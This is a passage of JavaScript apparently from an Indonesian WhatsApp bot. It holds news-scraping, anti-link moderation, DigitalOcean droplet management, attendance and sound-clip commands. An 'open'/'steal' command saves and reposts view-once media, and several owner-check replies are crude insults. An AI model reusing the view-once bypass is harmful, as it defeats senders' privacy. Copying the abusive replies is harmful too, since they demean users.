for (let i of res) {
no += 1
iwannnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnn += ""
reply(iwannnnnnnnnn) 
})
break
//=================================================//
case 'okezone':


OkezoneNews().then(async(res) => {
no = 0
iwannnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnn }, { quoted:m })
})
break
//=================================================//
case 'sindo':


SindoNews().then(async(res) => {
no = 0
iwannnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnn += ""
reply(iwannnnnnnnnnnn) 
})
break
//=================================================//
case 'tempo':


TempoNews().then(async(res) => {
no = 0
iwannnnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnn }, { quoted:m })
})
break
//=================================================//
case 'antara':


AntaraNews().then(async(res) => {
no = 0
iwannnnnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnnn }, { quoted:m })
})
break
//=================================================//
case "kontan":


KontanNews().then(async (res) => {
iwannnnnnnnnnnnnnn = ""
no = 0
for (let i of res) {
no += 1
iwannnnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnnnn }, { quoted:m })
})
break
//=================================================//
case "merdeka":


MerdekaNews().then(async (res) => {
iwannnnnnnnnnnnnnnn = ""
no = 0
for (let i of res) {
no += 1
iwannnnnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnnnnn }, { quoted:m })
})
break
//=================================================//
case "jalantikus":

var reis = await JalanTikusMeme()
tekcs = ""
tekcs += "Jalan Tikus Meme\n\n"
tekcs += `Source: ${reis}`
tekcs += ""
ptz.sendMessage(m.chat, { image : { url : reis }, caption: tekcs }, { quoted:m })
break
        
case 'open': case 'steal': {
if (!m.quoted) return reply(`Reply view once message to use this command`)
let typeS = Object.keys(m.quoted.message)[0]
let quotedType = m.quoted.message[typeS]
var mediaaaaaaaaaa = await downloadContentFromMessage(quotedType, typeS == "imageMessage" ? "image" : "video")
let buffer = Buffer.from([])
for await (let chunk of mediaaaaaaaaaa) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
await ptz.sendMessage(m.chat, { video: buffer, caption: quotedType.caption }, {quoted: m })
} 
else if (/image/.test(type)) {
await ptz.sendMessage(m.chat, { image: buffer, caption: quotedType.caption }, {quoted: m })
}
}
break;
// anti
        case 'antilinkgc': {
//if (!isCreator) return m.reply('Kamu bukan Owner')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
//if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')

if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
ntilink.push(m.chat)
m.reply('Succes menyalakan antilink di group ini')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = ntilink.indexOf(m.chat)
ntilink.splice(off, 1)
m.reply('Succes mematikan antilink di group ini')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'antiwame': {
if (!isGroup) return reply(`Hanya di Group`)
if (!isBotAdmins) return reply(`Bot harus jadi admin`)
////if (!isAdmins && !isCreator) return m.reply("khusus atmin")
//if (!isAdmins && !isCreator) return reply(`Khusus admin & Owner gue`)
if (args[0] === "on") {
if (antiWame) return reply('Already activated')
ntwame.push(m.chat)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
// reply('Success in turning on antiwame in this group')
var groupe = await ptz.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ptz.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send wa.me in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiWame) return reply('Already deactivated')
let off = nttoxic.indexOf(m.chat)
ntwame.splice(off, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
reply('Success in turning off antiwame in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break     
case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
if (!m.isGroup) return reply(`Hanya di Group`)
if (!isBotAdmins) return reply(`Bot bukan admin`)
//if (!isAdmins && !isCreator) return m.reply("khusus atmin")
//if (!isAdmins && !isCreator) return reply(`Khusus owner & Admin Group`)
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return reply('Already activated')
ntilinkytvid.push(m.chat)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
// reply('Success in turning on youtube video antilink in this group')
var groupe = await ptz.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ptz.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return reply('Already deactivated')
let off = ntilinkytvid.indexOf(m.chat)
ntilinkytvid.splice(off, 1)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
reply('Success in turning off youtube video antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
    case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return reply(`Hanya di Group`)
if (!isBotAdmins) return reply(`Bot bukan admin`)
//if (!isAdmins && !isCreator) return m.reply("khusus atmin")
//if (!isAdmins && !isCreator) return reply(`Khusus owner & Admin Group`)
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return reply('Already activated')
ntilinkytch.push(m.chat)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
// reply('Success in turning on youtube channel antilink in this group')
var groupe = await ptz.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ptz.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return reply('Already deactivated')
let off = ntilinkytch.indexOf(m.chat)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
reply('Success in turning off youtube channel antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
    case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return reply(`Hanya di Group`)
if (!isBotAdmins) return reply(`Bot bukan admin`)
//if (!isAdmins && !isCreator) return m.reply("khusus atmin")
//if (!isAdmins && !isCreator) return reply(`Khusus owner & Admin Group`)
if (args[0] === "on") {
if (AntiLinkFacebook) return reply('Already activated')
ntilinkfb.push(m.chat)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
// reply('Success in turning on facebook antilink in this group')
var groupe = await ptz.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ptz.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return reply('Already deactivated')
let off = ntilinkfb.indexOf(m.chat)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
reply('Success in turning off facebook antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
          case 'antilinktele': case 'antilinktg': {
if (!m.isGroup) return reply(`Hanya di Group`)
if (!isBotAdmins) return reply(`Bot bukan admin`)
//if (!isAdmins && !isCreator) return m.reply("khusus atmin")
//if (!isAdmins && !isCreator) return reply(`Khusus owner & Admin Group`)
if (args[0] === "on") {
if (AntiLinkTelegram) return reply('Already activated')
ntilinktg.push(m.chat)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
// reply('Success in turning on telegram antilink in this group')
var groupe = await ptz.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ptz.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return reply('Already deactivated')
let off = ntilinktg.indexOf(m.chat)
ntilinktg.splice(off, 1)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
reply('Success in turning off telegram antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
            case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return reply(`Hanya di Group`)
if (!isBotAdmins) return reply(`Bot bukan admin`)
//if (!isAdmins && !isCreator) return m.reply("khusus atmin")
//if (!isAdmins && !isCreator) return reply(`Khusus owner & Admin Group`)
if (args[0] === "on") {
if (AntiLinkTiktok) return reply('Already activated')
ntilinktt.push(m.chat)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
// reply('Success in turning on tiktok antilink in this group')
var groupe = await ptz.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ptz.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return reply('Already deactivated')
let off = ntilinktt.indexOf(m.chat)
ntilinktt.splice(off, 1)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
reply('Success in turning off tiktok antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
            case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return reply(`Hanya di Group`)
if (!isBotAdmins) return reply(`Bot bukan admin`)
//if (!isAdmins && !isCreator) return m.reply("khusus atmin")
//if (!isAdmins && !isCreator) return reply(`Khusus owner & Admin Group`)
if (args[0] === "on") {
if (AntiLinkTwitter) return reply('Already activated')
ntilinktwt.push(m.chat)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
// reply('Success in turning on twitter antilink in this group')
var groupe = await ptz.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ptz.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return reply('Already deactivated')
let off = ntilinktwt.indexOf(m.chat)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
reply('Success in turning off twitter antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break  
   case 'antilinkall': {
if (!isGroup) return reply(`Hanya di Group`)
if (!isBotAdmins) return reply(`Bot harus jadi admin`)
//if (!isAdmins && !isCreator) return m.reply("khusus atmin")
//if (!isAdmins && !isCreator) return reply(`Khusus admin & Owner gue`)
if (args[0] === "on") {
if (AntiLinkTwitter) return reply('Already activated')
ntilinkall.push(m.chat)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
// reply('Success in turning on all antilink in this group')
var groupe = await ptz.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ptz.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send any link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return reply('Already deactivated')
let off = ntilinkall.indexOf(m.chat)
ntilinkall.splice(off, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
reply('Success in turning off all antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break        


// DO
case "sisadroplet":{
if (!isCreator) return reply(`Ngapain Woi Tolol Yatim`)
async function getDropletInfo() {
  try {
    const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    if (accountResponse.status === 200 && dropletsResponse.status === 200) {
      const dropletLimit = accountResponse.data.account.droplet_limit;
      const dropletsCount = dropletsResponse.data.droplets.length;
      const remainingDroplets = dropletLimit - dropletsCount;

      return {
        dropletLimit,
        remainingDroplets,
        totalDroplets: dropletsCount,
      };
    } else {
      throw new Error('Gagal mendapatkan data akun DigitalOcean atau droplet.');
    }
  } catch (error) {
    throw error;
  }
}

// Definisikan fungsi untuk mengeksekusi kasus "sisadroplet"
async function sisadropletHandler() {
  try {
    if (!isCreator) {
      return reply('Lu Siapanya Gua Anjg');
    }

    const dropletInfo = await getDropletInfo();
    reply(`*Sisa Droplet Yang Dapat Anda Pakai: ${dropletInfo.remainingDroplets}*

*Total Droplet Yang Sudah Terpakai: ${dropletInfo.totalDroplets}*`);
  } catch (error) {
    reply(`Terjadi kesalahan: ${error.message}`);
  }
}

  sisadropletHandler();
  break;
}
case "restartvps": {
    if (!isCreator) return reply(`Idih Yatim So Asik Kontol`)
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  // Fungsi untuk melakukan restart VPS berdasarkan ID droplet
  const restartVPS = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'reboot'
        })
      });

      if (response.ok) {
        const data = await response.json();
        return data.action;
      } else {
        const errorData = await response.json();
        reply(`Gagal melakukan restart VPS: ${errorData.message}`);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan restart VPS:', error.message);
      reply('Terjadi kesalahan saat melakukan restart VPS.');
    }
  };

  restartVPS(dropletId)
    .then((action) => {
      reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
    })
    .catch((err) => {
      reply(err);
    });

  break;
}
case "turnoff": {
  if (!isCreator) return reply(`Yatim Kontol Rese`);
  
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  async function turnOffDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_off',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) sedang dimatikan...');
      } else {
        reply('Gagal mematikan VPS (Droplet).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mematikan VPS (Droplet):', error.message);
    }
  }

  turnOffDroplet();
  break;
}

        
case "turnon": {
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  async function turnOnDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_on',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) sedang dihidupkan...');
      } else {
        reply('Gagal menghidupkan VPS (Droplet).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat menghidupkan VPS (Droplet):', error.message);
    }
  }

  turnOnDroplet();
  break;
}
        
        
case "rebuild": {
  if (!isCreator) return reply(`Lu Siapanya Gua Anjg Gausah Nyuruh Nyuruh Gua Yatim`);

  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  let rebuildVPS = async () => {
    try {
      // Rebuild droplet menggunakan API DigitalOcean
      const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'rebuild',
          image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
        })
      });

      if (response.ok) {
        const data = await response.json();
        reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);

        // Mendapatkan informasi VPS setelah rebuild
        const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${API_TOKEN}`
          }
        });

        if (vpsInfo.ok) {
          const vpsData = await vpsInfo.json();
          const droplet = vpsData.droplet;
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';

          const textvps = `*VPS SUKSES REBUILD*\nIP VPS: ${ipAddress}\nSYSTEM IMAGE: ${droplet.image.slug}`;
          await sleep(60000) 
 ptz.sendMessage(m.chat, { text: textvps });
        } else {
          reply('Gagal mendapatkan informasi VPS setelah rebuild.');
        }
      } else {
        const errorData = await response.json();
        reply('Gagal melakukan rebuild VPS:', errorData.message);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan rebuild VPS:', error);
    }
  };

  rebuildVPS();
}
break;

        case "deldroplet": {
  if (!isCreator) return reply('Maaf, command ini hanya untuk pemilik.');

  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  let deleteDroplet = async () => {
    try {
      let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        reply('Droplet berhasil dihapus.');
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal menghapus droplet: ${errorData.message}`);
      }
    } catch (error) {
      console.error('Terjadi kesalahan saat menghapus droplet:', error);
      reply('Terjadi kesalahan saat menghapus droplet.');
    }
  };

  deleteDroplet();

  break;
}
case "listdroplet": {
  if (!isCreator) return reply("Anda bukan pemilik.");

  try {
    const getDroplets = async () => {
      try {
        const response = await fetch('https://api.digitalocean.com/v2/droplets', {
          headers: {
            Authorization: "Bearer " + API_TOKEN
          }
        });
        const data = await response.json();
        return data.droplets || [];
      } catch (error) {
        reply('Error fetching droplets: ' + error);
        return [];
      }
    };

    getDroplets().then(droplets => {
      let totalvps = droplets.length;
      let mesej = `List Droplet Digital Ocean Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

      if (droplets.length === 0) {
        mesej += 'Tidak ada Droplet yang tersedia.';
      } else {
        droplets.forEach(droplet => {
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
          mesej += `- Droplet Id: ${droplet.id}\n- Hostname: ${droplet.name}\n- Username Login: root\n- IP: ${ipAddress}\n- Ram: ${droplet.memory} MB\n- Cpu: ${droplet.vcpus} CPU\n- OS: ${droplet.image.distribution}\n- Storage: ${droplet.disk} GB\n- Status: ${droplet.status}\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;
        });
      }
      ptz.sendMessage(m.chat, { text: mesej });
    });
  } catch (err) {
    reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
  }

  break;
}
    
 case "cekdroplet": {
  if (!isCreator) return reply(`Ngapain? Kepo Amat Dah`);

  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  // Mendapatkan informasi droplet (VPS) berdasarkan ID
  const getDropletInfo = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}`;
      const response = await fetch(apiUrl, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        const data = await response.json();
        const droplet = data.droplet;
        const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
        const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
        const vpsRam = droplet.memory / 1024;

        return {
          dropletid: droplet.id,
          username: droplet.name,
          ip: ipAddress,
          ram: `${vpsRam} GB`,
          os: droplet.image.distribution,
          cpu: droplet.vcpus > 1 ? `${droplet.vcpus} vCPU` : `${droplet.vcpus} vCPUs`,
          storage: droplet.disk,
          status: droplet.status // Menambahkan status VPS
        };
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal memeriksa detail droplet: ${errorData.message}`);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat memeriksa detail droplet:', error.message);
      throw new Error('Terjadi kesalahan saat memeriksa detail droplet.');
    }
  };

  getDropletInfo(dropletId)
    .then((info) => {
      let textku = `*DETAIL VPS ANDA*\nDroplet Id: ${info.dropletid}\nHostname: ${info.username}\nIpv4 : ${info.ip}\nRam : ${info.ram}\nOS : ${info.os}\nCPU: ${info.cpu}\nStorage: ${info.storage}\nStatus : ${info.status}`;
      ptz.sendMessage(m.chat, { text: textku });
    })
    .catch((err) => {
      reply(err);
      ptz.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS.' });
    });

  break;
}
       
        
        // absen menu 
        case 'mulaiabsen': {
if (!isGroup) return reply('Hanya Di Group')
    const chatId = m.chat; 
    

    
    if (absenData[chatId]) {
        reply ('Absen sudah dimulai di obrolan ini!');
    }

   
    absenData[chatId] = {
        admin: userId, 
        participants: [], 
    };

    
    m.reply('Absen telah dimulai! Gunakan perintah *.absen* untuk bergabung dalam absen ini.');
}
break;


case 'absen': {
if (!isGroup) return reply('Hanya Di Group')
    const chatId = m.chat; 
    

   
    if (!absenData[chatId]) {
        m.reply ('Tidak ada proses absen yang sedang berlangsung di obrolan ini!');
    }
    absenData[chatId].participants.push(userId);

    m.reply('Anda telah berhasil bergabung dalam proses absen!');
}
break;

case 'cekabsen': {
if (!isGroup) return reply('Hanya Di Group')
    const chatId = m.chat;
    
    
    if (!absenData[chatId]) {
        reply ('Tidak ada proses absen yang sedang berlangsung di obrolan ini!');
    }

    
    const participants = absenData[chatId].participants;

    m.reply(`Daftar peserta absen:\n${participants.join(', ')}`);
}
break;

case 'hapusabsen': {
if (!isGroup) return reply('Hanya Di Group')
    
    const chatId = m.chat;
    if (absenData[chatId] && absenData[chatId].admin === m.sender) {
      
        delete absenData[chatId];
        
        m.reply('Proses absen telah dihapus!');
    } else {
        reply('Anda tidak memiliki izin untuk menghapus proses absen!');
    }
}
break    
        
    
     
     
     
     
     
     
     
    
        
        
        
        
        // AMPUN 
        case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'Sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
var resttt = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
 ptz.sendMessage(m.chat, { audio: resttt, mimetype: 'audio/mp4', ptt: true, 
})
break
        
        
        
        
        
        
        // poto meker
